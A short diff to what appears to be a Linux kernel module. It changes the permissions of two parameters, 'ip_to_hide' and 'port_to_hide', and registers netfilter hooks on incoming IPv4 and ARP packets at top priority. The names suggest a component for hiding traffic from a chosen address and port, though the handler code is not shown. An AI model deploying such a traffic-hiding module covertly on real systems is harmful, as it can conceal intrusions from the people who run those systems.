@@ -16,11 +16,11 @@ unsigned int handle_arp_packet(void *priv, struct sk_buff *skb, const struct nf_
 
 // Types & other consts.
 static char *ip_to_hide = NULL;
-module_param(ip_to_hide, charp, 0);
+module_param(ip_to_hide, charp, 0600);
 
 // 0 means no port filter.
 static unsigned int port_to_hide = -1;
-module_param(port_to_hide, int, 0);
+module_param(port_to_hide, int, 0600);
 
 static struct nf_hook_ops ip_trace_ops = { .hook = (nf_hookfn*)handle_ip_packet, .hooknum = NF_INET_LOCAL_IN, .pf = NFPROTO_IPV4, .priority = NF_IP_PRI_FIRST };
 static struct nf_hook_ops arp_trace_ops = { .hook = (nf_hookfn*)handle_arp_packet, .hooknum = NF_ARP_IN, .pf = NFPROTO_ARP, .priority = INT_MIN };
